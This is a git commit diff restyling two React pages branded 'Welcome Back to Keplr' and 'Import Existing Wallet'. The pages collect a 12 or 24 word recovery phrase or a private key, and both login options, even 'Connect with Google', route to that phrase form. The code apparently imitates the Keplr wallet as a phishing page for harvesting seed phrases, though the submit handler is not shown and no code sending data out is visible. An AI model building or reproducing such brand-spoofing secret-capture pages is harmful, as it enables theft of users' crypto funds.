1ffd2711bd6fdf2d3755adfe13574469bd1e46da
Aminjon Ffff <fayzmuhammadamirjoni@gmail.com>
2025-08-20 16:41:40 +0500

    fix

--- src/pages/Login.tsx
+++ src/pages/Login.tsx
@@ -3,71 +3,67 @@ import '../../public/assets/css/style.css';
 import '../../public/assets/css/login.css';
 
 import handsIcon from '../../public/assets/img/hands-icon.png';
-// import backIcon from '../../public/assets/img/back-icon.svg'; // если нужно, можно экспортировать svg как компонент
-// import headerLogo from '../../public/assets/img/header-logo.svg'; // если понадобится
 
 export default function Login() {
     return (
         <div className="welcome">
-          {/* Outer container + help */}
-          <div className="outer-container">
-            <div className="help-desc">
-              <span>Help Desk</span>
-              <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M36 18C36 27.9411 27.9411 36 18 36C8.05887 36 0 27.9411 0 18C0 8.05887 8.05887 0 18 0C27.9411 0 36 8.05887 36 18Z" fill="#2E2D32"/>
-                <path d="M16.4197 20.4375V20.2045C16.4197 19.5606 16.4728 19.0473 16.5788 18.6648C16.6887 18.2822 16.8478 17.9754 17.0561 17.7443C17.2644 17.5095 17.5182 17.2955 17.8175 17.1023C18.0561 16.9508 18.2682 16.7973 18.4538 16.642C18.6432 16.483 18.7929 16.3125 18.9027 16.1307C19.0125 15.9489 19.0675 15.7424 19.0675 15.5114C19.0675 15.2879 19.0144 15.0909 18.9084 14.9205C18.8023 14.75 18.6565 14.6193 18.4709 14.5284C18.2891 14.4337 18.0864 14.3864 17.8629 14.3864C17.6394 14.3864 17.4292 14.4375 17.2322 14.5398C17.0391 14.642 16.88 14.7879 16.755 14.9773C16.6338 15.1629 16.5713 15.3883 16.5675 15.6534H13.9538C13.9652 14.858 14.1489 14.2064 14.505 13.6989C14.8648 13.1913 15.3402 12.8163 15.9311 12.5739C16.522 12.3277 17.1735 12.2045 17.8857 12.2045C18.666 12.2045 19.3591 12.3258 19.9652 12.5682C20.575 12.8106 21.0542 13.1686 21.4027 13.642C21.7512 14.1155 21.9254 14.6951 21.9254 15.3807C21.9254 15.8314 21.8497 16.2292 21.6982 16.5739C21.5466 16.9186 21.3345 17.2235 21.0618 17.4886C20.7929 17.75 20.4766 17.9886 20.1129 18.2045C19.8288 18.3712 19.5921 18.5455 19.4027 18.7273C19.2171 18.9091 19.0769 19.1174 18.9822 19.3523C18.8875 19.5833 18.8402 19.8674 18.8402 20.2045V20.4375H16.4197ZM17.6754 24.1648C17.2663 24.1648 16.916 24.0208 16.6243 23.733C16.3364 23.4451 16.1944 23.0966 16.1982 22.6875C16.1944 22.286 16.3364 21.9432 16.6243 21.6591C16.916 21.3712 17.2663 21.2273 17.6754 21.2273C18.0656 21.2273 18.4084 21.3712 18.7038 21.6591C18.9993 21.9432 19.1489 22.286 19.1527 22.6875C19.1489 22.9602 19.0769 23.2083 18.9368 23.4318C18.8004 23.6553 18.6205 23.8333 18.397 23.9659C18.1773 24.0985 17.9368 24.1648 17.6754 24.1648Z" fill="#CFCFCF"/>
-              </svg>
-            </div>
-          </div>
-    
-          {/* Main container */}
-          <div className="container">
-            <a href="/home" className="back-btn">
-              <svg width="14" height="12" viewBox="0 0 14 12" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12.625 6H1.375M1.375 6L6.4375 11.0625M1.375 6L6.4375 0.9375" stroke="#ABABB5" strokeWidth="1.875" strokeLinecap="round" strokeLinejoin="round"/>
-              </svg>
-            </a>
-    
-            <h1 className="welcome__title">Welcome Back to Keplr</h1>
-            <div className="welcome__desc">
-              Glad you’re back! <img style={{ position: 'relative', top: '3px' }} src={handsIcon} alt="icon" />
-            </div>
-    
-            <div className="inner-container">
-              <div className="column">
-                <div className="welcome__column-title">Recovery Phrase or Private Key</div>
-                <div className="welcome__column-desc">
-                  Use an existing 12/24 word recovery phrase or private key. You can also import wallets from other wallet providers.
+            <div className="outer-container">
+                <div className="help-desc">
+                    <span>Help Desk</span>
+                    <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M36 18C36 27.9411 27.9411 36 18 36C8.05887 36 0 27.9411 0 18C0 8.05887 8.05887 0 18 0C27.9411 0 36 8.05887 36 18Z" fill="#2E2D32" />
+                        <path d="M16.4197 20.4375V20.2045C16.4197 19.5606 16.4728 19.0473 16.5788 18.6648C16.6887 18.2822 16.8478 17.9754 17.0561 17.7443C17.2644 17.5095 17.5182 17.2955 17.8175 17.1023C18.0561 16.9508 18.2682 16.7973 18.4538 16.642C18.6432 16.483 18.7929 16.3125 18.9027 16.1307C19.0125 15.9489 19.0675 15.7424 19.0675 15.5114C19.0675 15.2879 19.0144 15.0909 18.9084 14.9205C18.8023 14.75 18.6565 14.6193 18.4709 14.5284C18.2891 14.4337 18.0864 14.3864 17.8629 14.3864C17.6394 14.3864 17.4292 14.4375 17.2322 14.5398C17.0391 14.642 16.88 14.7879 16.755 14.9773C16.6338 15.1629 16.5713 15.3883 16.5675 15.6534H13.9538C13.9652 14.858 14.1489 14.2064 14.505 13.6989C14.8648 13.1913 15.3402 12.8163 15.9311 12.5739C16.522 12.3277 17.1735 12.2045 17.8857 12.2045C18.666 12.2045 19.3591 12.3258 19.9652 12.5682C20.575 12.8106 21.0542 13.1686 21.4027 13.642C21.7512 14.1155 21.9254 14.6951 21.9254 15.3807C21.9254 15.8314 21.8497 16.2292 21.6982 16.5739C21.5466 16.9186 21.3345 17.2235 21.0618 17.4886C20.7929 17.75 20.4766 17.9886 20.1129 18.2045C19.8288 18.3712 19.5921 18.5455 19.4027 18.7273C19.2171 18.9091 19.0769 19.1174 18.9822 19.3523C18.8875 19.5833 18.8402 19.8674 18.8402 20.2045V20.4375H16.4197ZM17.6754 24.1648C17.2663 24.1648 16.916 24.0208 16.6243 23.733C16.3364 23.4451 16.1944 23.0966 16.1982 22.6875C16.1944 22.286 16.3364 21.9432 16.6243 21.6591C16.916 21.3712 17.2663 21.2273 17.6754 21.2273C18.0656 21.2273 18.4084 21.3712 18.7038 21.6591C18.9993 21.9432 19.1489 22.286 19.1527 22.6875C19.1489 22.9602 19.0769 23.2083 18.9368 23.4318C18.8004 23.6553 18.6205 23.8333 18.397 23.9659C18.1773 24.0985 17.9368 24.1648 17.6754 24.1648Z" fill="#CFCFCF" />
+                    </svg>
                 </div>
-                <a href="/phrase" className="btn btn--one welcome__column-btn">
-                  <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <g clipPath="url(#clip0_0_802)">
-                      <path d="M1.5 8.25V9.375C1.5 9.9963 2.00368 10.5 2.625 10.5H9.375C9.9963 10.5 10.5 9.9963 10.5 9.375V8.25M8.25 6L6 8.25M6 8.25L3.75 6M6 8.25V1.5" stroke="white" strokeWidth="1.25" strokeLinecap="round" strokeLinejoin="round"/>
-                    </g>
-                    <defs>
-                      <clipPath id="clip0_0_802">
-                        <rect width="12" height="12" fill="white"/>
-                      </clipPath>
-                    </defs>
-                  </svg>
-                  <span>Use recovery phrase or private key</span>
-                </a>
-              </div>
-    
-              <div className="column">
-                <div className="welcome__column-title">Use Google</div>
-                <div className="welcome__column-desc">
-                  Log in with the same email address to import an existing account to Keplr.
-                </div>
-                <a href="/phrase" className="btn btn--two welcome__column-btn">
-                  <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M14.8898 7.90785H9.1221V10.2297H12.4171C12.275 10.9802 11.8439 11.6149 11.1942 12.0403C10.6451 12.3999 9.94425 12.6125 9.12052 12.6125C7.52572 12.6125 6.1768 11.5571 5.69469 10.139C5.57337 9.7794 5.50313 9.3948 5.50313 8.99925C5.50313 8.60362 5.57337 8.21903 5.69469 7.8594C6.17839 6.44287 7.52737 5.38749 9.1221 5.38749C10.0209 5.38749 10.8271 5.69081 11.4624 6.28495L13.2184 4.56352C12.1568 3.59414 10.7728 3 9.1221 3C6.72915 3 4.65864 4.34462 3.65132 6.30528C3.23627 7.11518 3 8.03138 3 9.00075C3 9.9702 3.23627 10.8848 3.65132 11.6947C4.65864 13.6554 6.72915 15 9.1221 15C10.776 15 12.1616 14.4622 13.1737 13.5459C14.3312 12.5015 15 10.963 15 9.13522C15 8.70997 14.9617 8.3019 14.8898 7.90785Z" fill="white"/>
-                  </svg>
-                  <span>Connect with Google</span>
-                </a>
-              </div>
             </div>
-          </div>
+
+            <div className="container">
+                <a href="/" className="back-btn">
+                    <svg width="14" height="12" viewBox="0 0 14 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12.625 6H1.375M1.375 6L6.4375 11.0625M1.375 6L6.4375 0.9375" stroke="#ABABB5" strokeWidth="1.875" strokeLinecap="round" strokeLinejoin="round" />
+                    </svg>
+                </a>
+
+                <h1 className="welcome__title">Welcome Back to Keplr</h1>
+                <div className="welcome__desc">
+                    Glad you’re back! <img style={{ position: 'relative', top: '3px' }} src={handsIcon} alt="icon" />
+                </div>
+
+                <div className="inner-container">
+                    <div className="column">
+                        <div className="welcome__column-title">Recovery Phrase or Private Key</div>
+                        <div className="welcome__column-desc">
+                            Use an existing 12/24 word recovery phrase or private key. You can also import wallets from other wallet providers.
+                        </div>
+                        <a href="/phrase" className="btn btn--one welcome__column-btn">
+                            <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <g clipPath="url(#clip0_0_802)">
+                                    <path d="M1.5 8.25V9.375C1.5 9.9963 2.00368 10.5 2.625 10.5H9.375C9.9963 10.5 10.5 9.9963 10.5 9.375V8.25M8.25 6L6 8.25M6 8.25L3.75 6M6 8.25V1.5" stroke="white" strokeWidth="1.25" strokeLinecap="round" strokeLinejoin="round" />
+                                </g>
+                                <defs>
+                                    <clipPath id="clip0_0_802">
+                                        <rect width="12" height="12" fill="white" />
+                                    </clipPath>
+                                </defs>
+                            </svg>
+                            <span>Use recovery phrase or private key</span>
+                        </a>
+                    </div>
+
+                    <div className="column">
+                        <div className="welcome__column-title">Use Google</div>
+                        <div className="welcome__column-desc">
+                            Log in with the same email address to import an existing account to Keplr.
+                        </div>
+                        <a href="/phrase" className="btn btn--two welcome__column-btn">
+                            <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M14.8898 7.90785H9.1221V10.2297H12.4171C12.275 10.9802 11.8439 11.6149 11.1942 12.0403C10.6451 12.3999 9.94425 12.6125 9.12052 12.6125C7.52572 12.6125 6.1768 11.5571 5.69469 10.139C5.57337 9.7794 5.50313 9.3948 5.50313 8.99925C5.50313 8.60362 5.57337 8.21903 5.69469 7.8594C6.17839 6.44287 7.52737 5.38749 9.1221 5.38749C10.0209 5.38749 10.8271 5.69081 11.4624 6.28495L13.2184 4.56352C12.1568 3.59414 10.7728 3 9.1221 3C6.72915 3 4.65864 4.34462 3.65132 6.30528C3.23627 7.11518 3 8.03138 3 9.00075C3 9.9702 3.23627 10.8848 3.65132 11.6947C4.65864 13.6554 6.72915 15 9.1221 15C10.776 15 12.1616 14.4622 13.1737 13.5459C14.3312 12.5015 15 10.963 15 9.13522C15 8.70997 14.9617 8.3019 14.8898 7.90785Z" fill="white" />
+                            </svg>
+                            <span>Connect with Google</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
         </div>
-      );
+    );
 }
--- src/pages/Phrase.tsx
+++ src/pages/Phrase.tsx
@@ -1,7 +1,7 @@
 import { useState, type FormEvent } from "react";
 
 export default function Phrase() {
-    const [activeType, setActiveType] = useState("phrase-12"); // phrase-12, phrase-24, phrase-key
+    const [activeType, setActiveType] = useState("phrase-12");
     const [words, setWords] = useState(Array(24).fill(""));
     const [key, setKey] = useState("");
     const [hdPathVisible, setHdPathVisible] = useState(false);
@@ -24,115 +24,142 @@ export default function Phrase() {
     const wordCount = activeType === "phrase-12" ? 12 : 24;
 
     return (
-        <div className="min-h-screen bg-gray-900 text-white p-6">
-            {/* Help Desk */}
-            <div className="flex justify-between items-center mb-6">
-                <span>Help Desk</span>
-                <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
-                    <circle cx="18" cy="18" r="18" fill="#2E2D32" />
-                    {/* Другие пути... */}
-                </svg>
+        <div className="login">
+            <div className="outer-container">
+                <div className="help-desc">
+                    <span>Help Desk</span>
+                    <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+                        <circle cx="18" cy="18" r="18" fill="#2E2D32" />
+                    </svg>
+                </div>
             </div>
 
-            {/* Back button */}
-            <a href="/login" className="inline-flex items-center mb-4 text-gray-400 hover:text-white">
-                <svg width="14" height="12" viewBox="0 0 14 12" fill="none">
-                    <path d="M12.625 6H1.375M1.375 6L6.4375 11.0625M1.375 6L6.4375 0.9375" stroke="#ABABB5" strokeWidth="1.875" strokeLinecap="round" strokeLinejoin="round" />
-                </svg>
-                <span className="ml-2">Back</span>
-            </a>
+            <div className="container">
+                <a href="/login" className="back-btn">
+                    <svg width="14" height="12" viewBox="0 0 14 12" fill="none">
+                        <path
+                            d="M12.625 6H1.375M1.375 6L6.4375 11.0625M1.375 6L6.4375 0.9375"
+                            stroke="#ABABB5"
+                            strokeWidth="1.875"
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                        />
+                    </svg>
+                </a>
 
-            <div className="mb-2 text-sm">Step 1/3</div>
-            <h1 className="text-3xl font-bold mb-2">Import Existing Wallet</h1>
-            <p className="mb-6 text-gray-300">
-                • Enter your recovery phrase here to restore your wallet. Or click on any blank and paste the entire phrase.<br />
-                • Enter the phrase in the right order without capitalization, punctuation symbols, or spaces.
-            </p>
+                <div className="step">Step 1/3</div>
+                <h1 className="login__title">Import Existing Wallet</h1>
+                <div className="login__desc">
+                    <span>•</span>Enter your recovery phrase here to restore your wallet. Or click on any blank and paste the entire
+                    phrase.
+                    <br />
+                    <span>•</span>Enter the phrase in the right order without capitalization, punctuation symbols, or spaces.
+                </div>
 
-            {/* Switch */}
-            <div className="flex gap-2 mb-4">
-                {["phrase-12", "phrase-24", "phrase-key"].map((type) => (
-                    <button
-                        key={type}
-                        onClick={() => setActiveType(type)}
-                        className={`px-4 py-2 rounded ${activeType === type ? "bg-blue-600" : "bg-gray-700"}`}
-                    >
-                        {type === "phrase-12" ? "12 word" : type === "phrase-24" ? "24 word" : "Private key"}
-                    </button>
-                ))}
-            </div>
-
-            {/* Forms */}
-            {activeType !== "phrase-key" ? (
-                <form onSubmit={handleSubmit}>
-                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2 mb-4">
-                        {Array.from({ length: wordCount }).map((_, i) => (
-                            <div key={i} className="flex items-center gap-2">
-                                <div>{i + 1}.</div>
-                                <input
-                                    type="password"
-                                    value={words[i]}
-                                    onChange={(e) => handleWordChange(i, e.target.value)}
-                                    className="flex-1 p-2 rounded bg-gray-800 text-white border border-gray-600"
-                                    placeholder={`Word ${i + 1}`}
-                                />
-                            </div>
-                        ))}
+                <div className="inner-container" id="inner-container">
+                    <div className="switch">
+                        <button
+                            type="button"
+                            data-type="phrase-12"
+                            className={`switch__item ${activeType === "phrase-12" ? "switch__item--active" : ""}`}
+                            onClick={() => setActiveType("phrase-12")}
+                        >
+                            12 word
+                        </button>
+                        <button
+                            type="button"
+                            data-type="phrase-24"
+                            className={`switch__item ${activeType === "phrase-24" ? "switch__item--active" : ""}`}
+                            onClick={() => setActiveType("phrase-24")}
+                        >
+                            24 word
+                        </button>
+                        <button
+                            type="button"
+                            data-type="phrase-key"
+                            className={`switch__item ${activeType === "phrase-key" ? "switch__item--active" : ""}`}
+                            onClick={() => setActiveType("phrase-key")}
+                        >
+                            Private key
+                        </button>
                     </div>
-                    <button
-                        type="button"
-                        onClick={() => setHdPathVisible(!hdPathVisible)}
-                        className="mb-4 px-4 py-2 bg-gray-700 rounded"
-                    >
-                        Set Derivation Path (Advanced)
-                    </button>
-                    <button
-                        type="submit"
-                        disabled={!words.slice(0, wordCount).every(Boolean)}
-                        className="px-4 py-2 bg-blue-600 rounded disabled:opacity-50"
-                    >
-                        Import
-                    </button>
-                </form>
-            ) : (
-                <form onSubmit={handleSubmit}>
-                    <input
-                        type="text"
-                        value={key}
-                        onChange={(e) => setKey(e.target.value)}
-                        className="mb-4 p-2 rounded bg-gray-800 text-white border border-gray-600 w-full"
-                        placeholder="Enter Private Key"
-                    />
-                    <button type="submit" disabled={!key} className="px-4 py-2 bg-blue-600 rounded disabled:opacity-50">
-                        Import
-                    </button>
-                </form>
-            )}
+
+                    {activeType !== "phrase-key" ? (
+                        <form className="login__form" id="phrase" onSubmit={handleSubmit}>
+                            <div className="login__fields">
+                                {Array.from({ length: wordCount }).map((_, i) => (
+                                    <div key={i} className="login__field-item">
+                                        <div className="login__field-number">{i + 1}.</div>
+                                        <input
+                                            type="password"
+                                            name={`word${i + 1}`}
+                                            className="login__input js-login-field"
+                                            value={words[i]}
+                                            onChange={(e) => handleWordChange(i, e.target.value)}
+                                        />
+                                    </div>
+                                ))}
+                            </div>
+
+                            <button
+                                type="button"
+                                className="btn login__path-btn"
+                                id="path-btn"
+                                onClick={() => setHdPathVisible(!hdPathVisible)}
+                            >
+                                Set Derivation Path (Advanced)
+                            </button>
+
+                            <button
+                                type="submit"
+                                className="login__submit-btn btn btn--one"
+                                disabled={!words.slice(0, wordCount).every(Boolean)}
+                            >
+                                Import
+                            </button>
+                        </form>
+                    ) : (
+                        <form className="login__form" id="key-form" onSubmit={handleSubmit}>
+                            <input
+                                type="text"
+                                id="key"
+                                className="input"
+                                value={key}
+                                onChange={(e) => setKey(e.target.value)}
+                            />
+                            <button
+                                type="submit"
+                                className="login__submit-btn btn btn--one"
+                                disabled={!key}
+                            >
+                                Import
+                            </button>
+                        </form>
+                    )}
+                </div>
+            </div>
 
             {/* HD Path Popup */}
             {hdPathVisible && (
-                <div className="fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center">
-                    <div className="bg-gray-800 p-6 rounded w-full max-w-md relative">
-                        <button
-                            onClick={() => setHdPathVisible(false)}
-                            className="absolute top-2 right-2 text-gray-400 hover:text-white"
-                        >
-                            ✕
-                        </button>
-                        <h2 className="text-xl font-bold mb-2">Set Custom Derivation Path</h2>
-                        <p className="text-gray-300 mb-4">
-                            • You can create multiple addresses from one recovery phrase<br />
-                            • A lost path cannot be recovered<br />
-                            • If you're unfamiliar with this feature, skip or undo this step - Reset Settings
-                        </p>
-                        <div className="flex gap-2 items-center">
-                            <span>m/-'/-'/</span>
-                            <input type="text" defaultValue="0" className="p-2 rounded bg-gray-700 border border-gray-600 w-16" />
-                            <span>'/</span>
-                            <input type="text" defaultValue="0" className="p-2 rounded bg-gray-700 border border-gray-600 w-16" />
-                            <span>'/</span>
-                            <input type="text" defaultValue="0" className="p-2 rounded bg-gray-700 border border-gray-600 w-16" />
-                        </div>
+                <div className="popup">
+                    <button className="popup__close-btn btn" type="button" onClick={() => setHdPathVisible(false)}>
+                        ✕
+                    </button>
+                    <div className="popup__title">Set Custom Derivation Path</div>
+                    <div className="popup__desc">
+                        <span>•</span>You can create multiple addresses from one recovery phrase
+                        <br />
+                        <span>•</span>A lost path cannot be recovered
+                        <br />
+                        <span>•</span>If you're unfamiliar with this feature, skip or undo this step - Reset Settings
+                    </div>
+                    <div className="popup__bottom-fields">
+                        <span>m/-'/-'/</span>
+                        <input name="popup-input" className="input js-popup-input js-field" value="0" type="text" />
+                        <span className="popup__separator">'/</span>
+                        <input name="popup-input" className="input js-popup-input js-field" value="0" type="text" />
+                        <span className="popup__separator">'/</span>
+                        <input name="popup-input" className="input js-popup-input js-field" value="0" type="text" />
                     </div>
                 </div>
             )}
